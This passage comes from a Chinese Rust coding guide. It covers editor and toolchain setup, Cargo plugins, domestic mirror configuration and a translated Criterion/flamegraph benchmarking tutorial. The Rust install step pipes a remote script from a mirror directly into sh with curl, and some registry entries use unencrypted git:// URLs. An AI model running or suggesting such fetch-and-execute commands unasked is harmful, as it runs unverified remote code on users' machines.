<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#duration_subsec">duration_subsec</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="附录"><a class="header" href="#附录">附录</a></h1>
<ul>
<li><a href="safe-guides/Appendix/./dev_env.html">A.开发环境</a></li>
<li><a href="safe-guides/Appendix/./test.html">B.测试</a>
<ul>
<li><a href="safe-guides/Appendix/./test/unit_test.html">单元测试</a></li>
<li><a href="safe-guides/Appendix/./test/benchmark.html">基准测试</a></li>
<li><a href="safe-guides/Appendix/./test/fuzz.html">模糊测试</a></li>
</ul>
</li>
<li><a href="safe-guides/Appendix/./terms.html">C.术语解释</a></li>
<li><a href="safe-guides/Appendix/./templates/intro.html">D.模板</a>
<ul>
<li><a href="safe-guides/Appendix/./templates/rustfmt.toml.html">rustfmt 模板</a></li>
<li><a href="safe-guides/Appendix/./templates/clippy.toml.html">clippy 模板</a></li>
<li><a href="safe-guides/Appendix/./templates/deny.toml.html">deny 模板</a></li>
</ul>
</li>
<li><a href="safe-guides/Appendix/./tools/intro.html">E.工具链</a>
<ul>
<li><a href="safe-guides/Appendix/./tools/rustfmt.html">rustfmt</a></li>
<li><a href="safe-guides/Appendix/./tools/noisy-clippy.html">noisy-clippy</a></li>
<li><a href="safe-guides/Appendix/./tools/cargo-udeps.html">cargo-udeps</a> </li>
</ul>
</li>
<li><a href="safe-guides/Appendix/./cheat-sheet/README.html">F.Cheat Sheet</a>
<ul>
<li><a href="safe-guides/Appendix/./cheat-sheet/Numbers/float.html">浮点数</a></li>
</ul>
</li>
<li><a href="safe-guides/Appendix/./optimizing/intro.html">G.优化指南</a></li>
<li><a href="safe-guides/Appendix/./rustc-flag.html">H.编译参数说明</a></li>
<li><a href="safe-guides/Appendix/./best-practice/intro.html">I.最佳实践</a>
<ul>
<li><a href="safe-guides/Appendix/./best-practice/qa.html">初学者常见问题Q&amp;A</a></li>
<li><a href="safe-guides/Appendix/./best-practice/tips.html">Rust 编程技巧</a></li>
</ul>
</li>
<li><a href="safe-guides/Appendix/./contribution.html">J.贡献说明</a></li>
<li><a href="safe-guides/Appendix/./old_guidelines.html">K.淘汰的规则</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="a开发环境"><a class="header" href="#a开发环境">A.开发环境</a></h1>
<h2 id="编辑器推荐"><a class="header" href="#编辑器推荐">编辑器推荐</a></h2>
<p>VSCode + Rust Analyzer 扩展 </p>
<p>其他辅助vscode 扩展：</p>
<p><a href="https://github.com/willcrichton/flowistry">flowistry</a> ，可以帮助开发者理解 Rust 程序。</p>
<h2 id="ide-推荐"><a class="header" href="#ide-推荐">IDE 推荐</a></h2>
<p>Clion</p>
<h2 id="工具链安装"><a class="header" href="#工具链安装">工具链安装</a></h2>
<p>使用<a href="https://github.com/rust-lang/rustup"> <code>Rustup</code></a>。 如需替代安装方式，为了保证安全，最好选择官方推荐的替代安装方式。</p>
<h2 id="rust--版次edition-说明"><a class="header" href="#rust--版次edition-说明"><strong>Rust  版次（Edition）</strong> <strong>说明</strong></a></h2>
<p>Rust从2015开始，每三年发布一个 Edition 版次：</p>
<blockquote>
<ol>
<li>Rust 2015 edition （Rust 1.0.0 + ）</li>
<li>Rust 2018 edition （Rust 1.31.0 +）</li>
<li>Rust 2021 edition (Rust 1.56.0 +)</li>
</ol>
</blockquote>
<p>以此类推。Edition是向前兼容的。Edition 和语义化版本是正交的，不冲突。</p>
<p>关于 Edition 更详细的内容可以查看：<a href="https://doc.rust-lang.org/edition-guide/">https://doc.rust-lang.org/edition-guide/</a></p>
<h2 id="稳定版-开发版和测试版工具链"><a class="header" href="#稳定版-开发版和测试版工具链"><strong>稳定版、 开发版和测试版工具链</strong></a></h2>
<p>Rust 工具链提供三种不同的发布渠道：</p>
<blockquote>
<ol>
<li>Nightly（开发版），每晚发布（release）一次。</li>
<li>Beta（测试版），每六周发布一次，基于Nightly版本。</li>
<li>Stable（稳定版），每六周发布一次，基于 beta版本。</li>
</ol>
</blockquote>
<p>注意：</p>
<blockquote>
<ol>
<li>推荐使用 Stable Rust。</li>
<li>在基于Nightly Rust 开发项目的时候，最好通过在项目中增加 rust-toolchain 文件来指定一个固定的版本，避免因为Nightly Rust 的频繁变更而导致项目编译问题。</li>
<li>当在稳定版工作的时候，如果需要Nightly工具链，不需要整体上去切换工具链到Nightly，只需要再命令中指明Nightly就可以了。比如 <code>cargo +nightly fmt</code>。</li>
</ol>
</blockquote>
<h2 id="包管理器-cargo"><a class="header" href="#包管理器-cargo"><strong>包管理器 Cargo</strong></a></h2>
<p>Cargo 是 Rust 项目必不可少的包管理器，除此之外，它也是一种工作流：</p>
<blockquote>
<ol>
<li>可以用Cargo创建一个项目（bin/lib）</li>
<li>可以用它编译项目</li>
<li>可以用它生产项目的文档（依据文档注释）</li>
<li>可以用它运行单元测试（test）和基准测试（bench）</li>
<li>可以用它下载和管理crate依赖</li>
<li>可以用它分发软件包，默认分发到 <a href="http://crates.io/">crates.io</a> 上面</li>
<li>可以为它编写插件，使用子命令的方式，扩展它的功能。</li>
</ol>
</blockquote>
<p>Cargo 通过 Cargo.toml 配置文件来管理 crate。</p>
<p>Toml 配置文件是一种最小化且无歧义的文件格式，Rust社区最常用Toml。可以通过 <a href="http://toml.io/">toml.io</a> 进一步了解 Toml 的细节。</p>
<p>值得说明的是，在配置文件中如果有 [profile.*] 这种配置，需要引起注意，因为这类配置决定了编译器的调用方式，比如：</p>
<blockquote>
<ol>
<li>debug-assertions ，决定了是否开启debug断言。</li>
<li>overflow-checks，决定了是否检查整数运算溢出。</li>
</ol>
</blockquote>
<p>关于Cargo的更多细节可以查看：<a href="https://doc.rust-lang.org/cargo/index.html">https://doc.rust-lang.org/cargo/index.html</a></p>
<h2 id="常用cargo插件"><a class="header" href="#常用cargo插件">常用Cargo插件</a></h2>
<p><strong>Clippy</strong></p>
<p>Clippy 是一个静态分析工具，它提供了很多检查，比如错误、 样式、 性能问题、 Unsafe UB问题等等。从1.29版本开始，Clippy可以用于 Stable Rust中。</p>
<p>可以通过 <code>rustup component add clippy</code> 来安装此 Cargo 插件。</p>
<p>细节参考：<a href="https://github.com/rust-lang/rust-clippy">https://github.com/rust-lang/rust-clippy</a></p>
<p>Clippy 的全部 lint 检查建议列表： <a href="https://rust-lang.github.io/rust-clippy/master/">https://rust-lang.github.io/rust-clippy/master/</a></p>
<p><strong>Rustfmt</strong></p>
<p>Rustfmt 是一个根据风格指南原则来格式化代码的工具。</p>
<p>可以通过 Rustup 来安装它： <code>rustup component add rustfmt</code></p>
<p>Rustfmt 依赖的社区维护的 Rust风格指南：<a href="https://github.com/rust-dev-tools/fmt-rfcs/tree/master/guide">https://github.com/rust-dev-tools/fmt-rfcs/tree/master/guide</a></p>
<p>开发者也可以通过 <code>rustfmt.toml</code> 或 <code>.rustfmt.toml</code> 来定制团队统一的代码风格，比如：</p>
<pre><code class="language-toml"># Set the maximum line width to 120
max_width = 120
# Maximum line length for single line if-else expressions
single_line_if_else_max_width = 40
</code></pre>
<p><strong>Rustfix</strong></p>
<p>从 Rust 2018 edition开始，Rustfix就被包含在 Rust 中。它可以用来修复编译器警告。</p>
<p>需要注意的是，在使用 cargo fix 进行自动修复警告的时候，需要开发者确认这个警告是否真的需要修复，并且要验证修复的是否正确。</p>
<p><strong>Cargo Edit</strong></p>
<p>Cargo Edit插件为Cargo扩展了三个命令：</p>
<blockquote>
<ol>
<li>Cargo add，在命令行增加新的依赖，而不需要去知道这个依赖的语义版本。</li>
<li>Cargo rm，在命令行删除一个指定依赖。</li>
<li>Cargo upgrade，在命令行升级一个指定依赖。</li>
</ol>
</blockquote>
<p>Cargo-edit地址：<a href="https://github.com/killercup/cargo-edit">https://github.com/killercup/cargo-edit</a></p>
<p><strong>Cargo Audit</strong></p>
<p>Cargo Audit 可以根据 Rust安全警报数据库（RestSec Advisory Database ）的漏洞数据，扫描crate以及它的所有依赖库，然后给出一份安全报告。</p>
<p>更多细节：<a href="https://github.com/RustSec/cargo-audit">https://github.com/RustSec/cargo-audit</a></p>
<p>Rust 安全警报数据库：<a href="https://rustsec.org/">https://rustsec.org/</a></p>
<p><strong>Cargo Outdated</strong></p>
<p>该插件可以检测依赖库是否有新版本可用。</p>
<p>更多细节：<a href="https://github.com/kbknapp/cargo-outdated">https://github.com/kbknapp/cargo-outdated</a></p>
<p><strong>Cargo Deny</strong></p>
<p>该插件可以检测依赖中的软件许可证（License），如果和开发者配置的不符合，则会拒绝使用该依赖。</p>
<p>更多细节：<a href="https://github.com/EmbarkStudios/cargo-deny">https://github.com/EmbarkStudios/cargo-deny</a></p>
<p>Cargo Deny Book： <a href="https://embarkstudios.github.io/cargo-deny/">https://embarkstudios.github.io/cargo-deny/</a></p>
<h2 id="rustup-和-crates-国内镜像"><a class="header" href="#rustup-和-crates-国内镜像">Rustup 和 crates 国内镜像</a></h2>
<h3 id="加速-rustup"><a class="header" href="#加速-rustup">加速 Rustup</a></h3>
<p>我们需要指定 <code>RUSTUP_DIST_SERVER</code>（默认指向 https://static.rust-lang.org）和 <code>RUSTUP_UPDATE_ROOT</code> （默认指向https://static.rust-lang.org/rustup），这两个网站均在中国大陆境外，因此在中国大陆访问会很慢，需要配置成境内的镜像。</p>
<p>以下<code> RUSTUP_DIST_SERVER</code> 和 <code>RUSTUP_UPDATE_ROOT</code> 可以组合使用。</p>
<pre><code class="language-toml"># 清华大学
RUSTUP_DIST_SERVER=https://mirrors.tuna.tsinghua.edu.cn/rustup

# 中国科学技术大学
RUSTUP_DIST_SERVER=https://mirrors.ustc.edu.cn/rust-static
RUSTUP_UPDATE_ROOT=https://mirrors.ustc.edu.cn/rust-static/rustup

# 上海交通大学
RUSTUP_DIST_SERVER=https://mirrors.sjtug.sjtu.edu.cn/rust-static/


# 字节跳动
RUSTUP_DIST_SERVER=&quot;https://rsproxy.cn&quot;
RUSTUP_UPDATE_ROOT=&quot;https://rsproxy.cn/rustup&quot;
</code></pre>
<h3 id="加速-crates"><a class="header" href="#加速-crates">加速 crates</a></h3>
<p>将如下配置写入 <code>$HOME/.cargo/config</code> 文件：</p>
<pre><code class="language-toml">
# 放到 `$HOME/.cargo/config` 文件中
[source.crates-io]
registry = &quot;https://github.com/rust-lang/crates.io-index&quot;

# 替换成你偏好的镜像源，比如 字节跳动的
replace-with = 'rsproxy'

# 清华大学
[source.tuna]
registry = &quot;https://mirrors.tuna.tsinghua.edu.cn/git/crates.io-index.git&quot;

# 中国科学技术大学
[source.ustc]
registry = &quot;git://mirrors.ustc.edu.cn/crates.io-index&quot;

# 上海交通大学
[source.sjtu]
registry = &quot;https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index&quot;

# rustcc社区
[source.rustcc]
registry = &quot;git://crates.rustcc.cn/crates.io-index&quot;

# 字节跳动 https://rsproxy.cn/
[source.rsproxy]
registry = &quot;https://rsproxy.cn/crates.io-index&quot;

[registries.rsproxy]
index = &quot;https://rsproxy.cn/crates.io-index&quot;

[net]
git-fetch-with-cli = true

</code></pre>
<h3 id="安装-rust"><a class="header" href="#安装-rust">安装 Rust</a></h3>
<p>使用 字节跳动源：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span><span class="boring">export the env above first
</span>curl --proto '=https' --tlsv1.2 -sSf https://rsproxy.cn/rustup-init.sh | sh
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="b测试"><a class="header" href="#b测试">B.测试</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="单元测试"><a class="header" href="#单元测试">单元测试</a></h1>
<p>Rust 支持单元测试。</p>
<h2 id="测试代码组织"><a class="header" href="#测试代码组织">测试代码组织</a></h2>
<p>对于内部函数，单元测试代码最好放到业务代码的同一个模块下。</p>
<p>对于外部接口，单元测试最好放到独立的 <code>tests</code> 目录。</p>
<h2 id="文档测试"><a class="header" href="#文档测试">文档测试</a></h2>
<p>对所有对外接口进行文档测试是一个不错的开始。</p>
<h2 id="编译测试"><a class="header" href="#编译测试">编译测试</a></h2>
<p>通过 <code>compiletest</code> 来测试某些代码可能无法编译。 参考： <a href="https://rustc-dev-guide.rust-lang.org/tests/adding.html#ui">Rustc开发指南</a></p>
<h2 id="随机测试"><a class="header" href="#随机测试">随机测试</a></h2>
<p>使用 第三方库<code>proptest</code> 来进行随机测试。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use proptest::prelude::*;

proptest! {
    #[test]
    fn check_count_correct(haystack: Vec&lt;u8&gt;, needle: u8) {
        prop_assert_eq!(count(&amp;haystack, needle), naive_count(&amp;haystack, needle));
    }
}
<span class="boring">}
</span></code></pre></pre>
<h2 id="代码测试率覆盖检测工具"><a class="header" href="#代码测试率覆盖检测工具">代码测试率覆盖检测工具</a></h2>
<p><a href="https://github.com/xd009642/tarpaulin">tarpaulin</a> 是 Cargo 构建系统的代码覆盖率报告工具，目前 <strong>仅支持运行 Linux 的 x86_64 处理器</strong>。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="基准测试"><a class="header" href="#基准测试">基准测试</a></h1>
<p>说明： 借用 MogoDB 工程师 Patrick 的文章来了解 Rust 里做基准测试基本姿势。</p>
<blockquote>
<p>原文： <a href="https://patrickfreed.github.io/rust/2021/10/15/making-slow-rust-code-fast.html">https://patrickfreed.github.io/rust/2021/10/15/making-slow-rust-code-fast.html</a></p>
</blockquote>
<h2 id="使用-criterionrs-和-火焰图flamegraphs-进行性能调优"><a class="header" href="#使用-criterionrs-和-火焰图flamegraphs-进行性能调优">使用 Criterion.rs 和 火焰图（flamegraphs） 进行性能调优</a></h2>
<p>性能是开发者为其应用程序选择 Rust 的首要原因之一。事实上，它是 <code>rust-lang.org</code> 主页上 <a href="https://www.rust-lang.org/#:%7E:text=Version%201.55.0-,Why%20Rust%3F,-Performance">&quot;为什么选择Rust？&quot;</a>一节中列出的第一个原因，甚至在内存安全之前。这也是有原因的，许多基准测试表明，用Rust编写的软件速度很快，有时甚至是<a href="https://www.techempower.com/benchmarks/#section=data-r18&amp;hw=ph&amp;test=fortune">最快</a>的。但这并不意味着所有用Rust编写的软件都能保证快速。事实上，写低性能的Rust代码是很容易的，特别是当试图通过Clone 或<code>Arc</code>替代借用来&quot;&quot;安抚&quot;&quot;借用检查器时，这种策略通常被推荐给 Rust 新手。这就是为什么对 Rust 代码进行剖析和基准测试是很重要的，可以看到任何瓶颈在哪里，并修复它们，就像在其他语言中那样。在这篇文章中，我将根据最近的工作经验，展示一些基本的工具和技术，以提高 <code>mongodb</code>  crate 的性能。</p>
<p>注意：本帖中使用的所有示例代码都可以在<a href="https://github.com/patrickfreed/benchmark-example">这里</a>找到。</p>
<h2 id="索引"><a class="header" href="#索引">索引</a></h2>
<ul>
<li><a href="safe-guides/Appendix/test/benchmark.html#%E6%80%A7%E8%83%BD%E5%89%96%E6%9E%90">性能剖析(Profiling)</a>
<ul>
<li><a href="safe-guides/Appendix/test/benchmark.html#%E5%9F%BA%E5%87%86%E6%B5%8B%E8%AF%95">基准测试(Benchmarking)</a></li>
<li><a href="safe-guides/Appendix/test/benchmark.html#%E7%81%AB%E7%84%B0%E5%9B%BE%E7%94%9F%E6%88%90">火焰图生成</a></li>
<li><a href="safe-guides/Appendix/test/benchmark.html#%E8%AF%86%E5%88%AB%E7%81%AB%E7%84%B0%E5%9B%BE%E4%B8%AD%E7%9A%84%E7%93%B6%E9%A2%88">识别火焰图中的瓶颈</a></li>
</ul>
</li>
<li><a href="safe-guides/Appendix/test/benchmark.html#%60Clone%60%E7%9A%84%E2%80%9C%E8%A2%AD%E5%87%BB%E2%80%9D"> <code>Clone</code> 的 “袭击”</a></li>
<li><a href="safe-guides/Appendix/test/benchmark.html#%E5%8A%A0%E9%80%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">加速反序列化</a></li>
<li><a href="safe-guides/Appendix/test/benchmark.html#%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C">分析结果</a>
<ul>
<li><a href="safe-guides/Appendix/test/%E6%9F%A5%E7%9C%8BCriterion%E7%9A%84HTML%E6%8A%A5%E5%91%8A">查看Criterion的HTML报告</a></li>
<li><a href="safe-guides/Appendix/test/benchmark.html#%E4%BD%BF%E7%94%A8%60wrk%60%E8%BF%9B%E8%A1%8C%E5%8E%8B%E6%B5%8B">使用<code>wrk</code>进行压测</a></li>
</ul>
</li>
<li><a href="safe-guides/Appendix/test/benchmark.html#%E4%B8%8B%E4%B8%80%E6%AD%A5">下一步</a></li>
<li><a href="safe-guides/Appendix/test/benchmark.html#%E6%80%BB%E7%BB%93">总结</a></li>
<li><a href="safe-guides/Appendix/test/benchmark.html#%E5%B9%BF%E5%91%8A%E6%97%B6%E9%97%B4">广告时间</a></li>
</ul>
<h2 id="性能剖析"><a class="header" href="#性能剖析">性能剖析</a></h2>
<p>在进行任何性能调优工作时，在试图修复任何东西之前，绝对有必要对代码进行性能剖析（profiling），因为瓶颈往往位于意想不到的地方，而且怀疑的瓶颈往往不如你想的那样对性能有足够影响。如果不遵守这一原则，就会导致<a href="https://wiki.c2.com/?PrematureOptimization">过早优化</a>，这可能会不必要地使代码复杂化并浪费开发时间。这也是为什么建议新人在开始的时候自由地 Clone ，这样可以帮助提高可读性，而且可能不会对性能产生严重的影响，但是如果他们这样做了，以后的性能剖析会发现这一点，所以在那之前没有必要担心。</p>
<blockquote>
<p>过早优化（Premature Optimization）</p>
<p>Premature optimization is the root of all evil.  --  DonaldKnuth</p>
<p>在 DonaldKnuth 的论文 《 Structured Programming With GoTo Statements 》中，他写道：&quot;程序员浪费了大量的时间去考虑或担心程序中非关键部分的速度，而当考虑到调试和维护时，这些对效率的尝试实际上会产生强烈的负面影响。我们应该忘记这种微小的效率，比如说因为过早优化而浪费的大约97%的时间。然而，我们不应该放弃那关键的 3% 的机会&quot;。</p>
</blockquote>
<h3 id="基准测试-1"><a class="header" href="#基准测试-1">基准测试</a></h3>
<p>剖析的第一步是建立一套一致的基准，可以用来确定性能的基线水平，并衡量任何渐进的改进。在 <code>mongodb</code> 的案例中，标准化的<a href="https://github.com/mongodb/specifications/blob/master/source/benchmarking/benchmarking.rst"><code>MongoDB</code> 驱动微基准集</a>在这方面发挥了很好的作用，特别是因为它允许在用其他编程语言编写的<code>MongoDB</code>驱动之间进行比较。由于这些是 &quot;微 &quot;基准，它们还可以很容易地测量单个组件的变化（例如，读与写），这在专注于在特定领域进行改进时是非常有用的。</p>
<p>一旦选择了基准，就应该建立一个稳定的环境，可以用来进行所有的定时测量。确保环境不发生变化，并且在分析时不做其他 &quot;工作&quot;（如浏览猫的图片），这对减少基准测量中的噪音很重要。</p>
<h4 id="用-cargo-bench-和-criterionrs-来执行基准测试"><a class="header" href="#用-cargo-bench-和-criterionrs-来执行基准测试">用 <code>cargo bench</code> 和 <code>Criterion.rs</code> 来执行基准测试</a></h4>
<p>Rust 提供的基准测试只能在 Nightly 下使用，因为它还未稳定。它对简单的基准测试比较有用，但是功能有限，而且没有很好的文档。另一个选择是<a href="https://crates.io/crates/criterion"> <code>criterion</code></a> crate。它为基准测试提供了更多的可配置性和丰富的功能支持，同时支持稳定的Rust ！我将详细介绍基本的 criterion crate。</p>
<p>我将在这里详细介绍一个基本的 criterion 设置，但如果想了解更多信息，我强烈推荐你查看优秀的<a href="https://bheisler.github.io/criterion.rs/book/index.html"> Criterion.rs 用户指南</a>。</p>
<p>在对<code>mongodb</code>进行基准测试时，我首先使用<code>cargo new &lt;my-benchmark-project&gt;</code>创建了一个新项目，并在<code>Cargo.toml</code>中添加了以下几行。</p>
<pre><code class="language-toml">[dependencies]
tokio = { version = &quot;1&quot;, features = [&quot;full&quot;] }
futures = { version = &quot;0.3&quot;, default-features = false }
mongodb = { path = &quot;/home/patrick/mongo-rust-driver&quot; }

[dev-dependencies]
criterion = { version = &quot;0.3.5&quot;, features = [&quot;async_tokio&quot;, &quot;html_reports&quot;] }

[[bench]]
name = &quot;find&quot;
harness = false
</code></pre>
<p>在我的基准测试中，使用了<code> tokio</code> 异步运行时，所以我需要把它指定为一个依赖项，并启用<code>async_tokio</code>的 <code>criterion </code> features，但如果你不使用<code>tokio</code>，这不是必需的。我还需要使用<code>futures</code> crate提供的一些功能，但这对于运行一个<code>criterion</code>  基准来说也是没有必要的。对于我的<code>mongodb</code>依赖，我指定了一个本地克隆库的路径，这样我就可以对我做的任何改动进行基准测试。另外，在这个例子中，我将专注于对<code>mongodb</code> crate的<a href="https://docs.rs/mongodb/2.0.0/mongodb/struct.Collection.html#method.find"><code>Collection::find</code></a>方法进行基准测试，所以我对基准进行了相应的命名，但你可以对你的基准测试进行任意命名。</p>
<p>接下来，需要创建一个<code>benches/find.rs</code>文件来包含基准测试。文件名需要与<code>Cargo.toml</code>中的名称字段中指定的值相匹配。下面是一个测试<code>Collection::find</code>性能的简单基准测试的例子。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use criterion::{criterion_group, criterion_main, Criterion};
use futures::TryStreamExt;
use mongodb::{
    bson::{doc, Document},
    Client,
};

pub fn find_bench(c: &amp;mut Criterion) {
    // begin setup

    // create the tokio runtime to be used for the benchmarks
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .unwrap();

    // seed the data server side, get a handle to the collection
    let collection = rt.block_on(async {
        let client = Client::with_uri_str(&quot;mongodb://localhost:27017&quot;)
            .await
            .unwrap();

        let collection = client.database(&quot;foo&quot;).collection(&quot;bar&quot;);
        collection.drop(None).await.unwrap();

        let doc = doc! {
            &quot;hello&quot;: &quot;world&quot;,
            &quot;anotherKey&quot;: &quot;anotherValue&quot;,
            &quot;number&quot;: 1234
        };
        let docs = vec![&amp;doc; 10_000];
        collection.insert_many(docs, None).await.unwrap();
        collection
    });
    // end setup

    c.bench_function(&quot;find&quot;, |b| {
        b.to_async(&amp;rt).iter(|| {
            // begin measured portion of benchmark
            async {
                collection
                    .find(doc! {}, None)
                    .await
                    .unwrap()
                    .try_collect::&lt;Vec&lt;Document&gt;&gt;()
                    .await
                    .unwrap();
            }
        })
    });
}

criterion_group!(benches, find_bench);
criterion_main!(benches);
<span class="boring">}
</span></code></pre></pre>
<p><code>find_bench</code>函数包含设置和运行基准的所有代码。该函数可以被任意命名，但是它需要接收一个<code>&amp;mut Criterion</code>作为参数。该函数的第一部分包含设置代码，在基准运行前只执行一次，其运行时间根本不被测量。实际测量的部分是稍后被传入<code>Bencher::iter</code>的闭包。该闭包将被多次运行，每次运行的时间将被记录、分析，并包含在一个HTML报告中。</p>
<p>在这个特定的例子中，设置涉及到创建<code>tokio</code>运行时，该运行时将用于基准测试的其余部分。通常，这是在幕后通过<code>tokio::main</code>宏完成的，或者，在库的情况下，根本就不需要。然而，我们需要在这里手动创建一个运行时，以便我们以后可以通过<code>Bencher::to_async</code>方法将其传递给<code>criterion</code>。一旦运行时被创建，设置就会继续进行，即填充我们在实际基准中要查询的<code>MongoDB</code>集合。由于这涉及到异步<code>API</code>的使用，我们需要通过<code>Runtime::block_on</code>确保它们在异步运行时的上下文中执行。在实际测量部分，我们对设置时创建的集合中的所有文档进行查询。</p>
<p>所有这些都准备好了（并且我们的<code>MongoDB</code>实例正在运行），我们可以运行<code>cargo bench</code>来建立我们的基线。输出结果将如下。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>~/benchmark-example$ cargo bench
    Finished bench [optimized] target(s) in 0.07s
     Running unittests (target/release/deps/benchmark_example-b9c25fd0639c5e9c)

running 0 tests

test result: ok. 0 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s

     Running unittests (target/release/deps/find-e1f66bfc9cf31158)
Gnuplot not found, using plotters backend
Benchmarking find: Warming up for 3.0000 s
find                    time:   [55.442 ms 55.663 ms 55.884 ms]
<span class="boring">}
</span></code></pre></pre>
<p>这里最重要的信息是时间： <code>[55.442 ms 55.663 ms 55.884 ms]</code>。中间的值是对每次迭代所花时间的最佳估计，第一个和最后一个值定义了置信区间（Confidence interval）的上界和下界。默认情况下，使用的置信度是<code>95%</code>，这意味着该区间有<code>95%</code>的机会包含迭代的实际平均运行时间。关于这些值以及如何计算的更多信息，请查看<code>Criterion.rs</code>用户指南。</p>
<p>现在，如果我们再次执行<code>cargo bench</code>，它将记录更多的时间，并与之前的时间进行比较（之前的数据存储在目标/标准中），报告任何变化。鉴于我们根本没有改变代码，这应该报告说没有任何变化。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>find                    time:   [55.905 ms 56.127 ms 56.397 ms]
                        change: [+0.3049% +0.8337% +1.4904%] (p = 0.01 &lt; 0.05)
                        Change within noise threshold.
Found 5 outliers among 100 measurements (5.00%)
  1 (1.00%) low mild
  2 (2.00%) high mild
  2 (2.00%) high severe
<span class="boring">}
</span></code></pre></pre>
<p>正如预期的那样，criterion  报告说，与上次运行相比，任何性能的变化都可能是由于噪音造成的。现在我们已经建立了一个基线，现在是时候对代码进行剖析，看看它哪里慢。</p>
<h3 id="火焰图生成"><a class="header" href="#火焰图生成">火焰图生成</a></h3>
<p><a href="https://perf.wiki.kernel.org/index.php/Main_Page">perf</a> 是一个Linux命令行工具，可以用来获取一个应用程序的性能信息。我们不会直接使用它，而是通过<a href="https://crates.io/crates/flamegraph"><code>flamegraph</code> </a> crate，它是一个基于Rust的flamegraph生成器，可以与<code>cargo</code>一起工作。</p>
<p>火焰图（<a href="https://github.com/brendangregg/FlameGraph"><code>Flamegraphs</code></a>）是程序在每个函数中花费时间的有用的可视化数据。在被测量的执行过程中调用的每个函数被表示为一个矩形，每个调用栈被表示为一个矩形栈。一个给定的矩形的宽度与在该函数中花费的时间成正比，更宽的矩形意味着更多的时间。火焰图对于识别程序中的慢速部分非常有用，因为它们可以让你快速识别代码库中哪些部分花费的时间不成比例。</p>
<p>要使用<code>cargo</code>生成<code>flamegraphs</code>，首先我们需要安装<code>perf</code>和<code>flamegraph </code>crate。这在<code>Ubuntu</code>上可以通过以下方式完成。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>sudo apt-get install linux-tools-common linux-tools-`uname -r`
cargo install flamegraph
<span class="boring">}
</span></code></pre></pre>
<p>一旦安装完成，我们就可以生成我们的基线的第一个<code>flamegraph</code>! 要做到这一点，请运行以下程序。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>cargo flamegraph --bench find -o find-baseline.svg -- --bench
<span class="boring">}
</span></code></pre></pre>
<p>然后你可以在浏览器中打开<code>find-baseline.svg</code>来查看火焰图。如果你在运行<code>cargo flamegraph</code>时遇到权限问题，请参阅<code>flamegraph</code> crate的<code>README</code>中的说明。</p>
<p>生成 criterion 基准的<code>flamegraph</code>可能会有噪音，因为很多时间都花在了 criterion（例如测量时间）和设置上，而不是在被基准测试的部分。为了减少火焰图中的一些噪音，你可以写一个与基准的测量部分行为类似的程序，然后生成另一个火焰图来代替。</p>
<p>例如，我用下面的命令从一个普通的二进制程序中生成一个火焰图，该程序使用我的本地<code>mongodb</code> crate副本来执行没有criterion的查找。</p>
<pre><code>cargo flamegraph --bin my-binary -o find-baseline.svg
</code></pre>
<p>这里是生成的火焰图（在新的浏览器标签页中打开它来探索）。</p>
<p><img src="https://patrickfreed.github.io/resources/making-slow-rust-code-fast/find-baseline.svg" alt="`" /></p>
<p>现在我们可以看到时间花在哪里了，现在是时候深入研究，看看我们是否能找到瓶颈。</p>
<h3 id="识别火焰图中的瓶颈"><a class="header" href="#识别火焰图中的瓶颈">识别火焰图中的瓶颈</a></h3>
<p>火焰图中的栈从底部开始，随着调用栈的加深而向上移动（左右无所谓），通常这是开始阅读它们的最佳方式。看一下上面火焰图的底部，最宽的矩形是<code>Future::poll</code>，但这并不是因为Rust 的 <code>Future</code> 超级慢，而是因为每个<code>.await</code>都涉及轮询（poll）<code>Future</code>。考虑到这一点，我们可以跳过任何轮询矩形，直到我们可以在<code>mongodb</code>中看到我们关心的信息的函数。下面火焰图的注释版本，突出了需要注意的部分。</p>
<p><img src="https://patrickfreed.github.io/resources/making-slow-rust-code-fast/flamegraph-annotated.png" alt="2" /></p>
<p>蓝色方块包含了调用<code>CommandResponse::body</code>所花费的时间，它显示几乎所有的时间都花在了<code>clone()</code>上。各个紫色矩形对应的是将<code>BSON</code>（MongoDB使用的二进制格式）解析到<code>Document</code>中所花费的时间，绿色矩形对应的是<code>Document</code>的<code>serde::Deserialize</code>实现中所花费的时间。最后，黑色虚线矩形对应的是释放内存的时间，黑色实线对应的是将命令序列化为<code>BSON</code>的时间。</p>
<p>现在我们知道了大部分时间花在哪里（只在少数几个地方），我们可以集中精力实际改变代码，使其更快。</p>
<h2 id="clone的袭击"><a class="header" href="#clone的袭击"><code>Clone</code>的“袭击”</a></h2>
<p>无论做任何事，从最容易实现的地方开始，往往可以产生最好的回报。在这个例子中，只是  <code>clone</code> 就花费了一大块时间，所以我们能简单地消除 <code>clone</code>。从火焰图里知道，最昂贵的<code>clone</code> 就是 <code>CommandResponse::body</code> 中调用的那个，所以我们去看看这个<a href="https://github.com/mongodb/mongo-rust-driver/blob/v2.0.0-beta/src/cmap/conn/command.rs#L138">方法</a>。</p>
<p>在 <code>command.rs:149</code> 行，我们看到如下定义：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
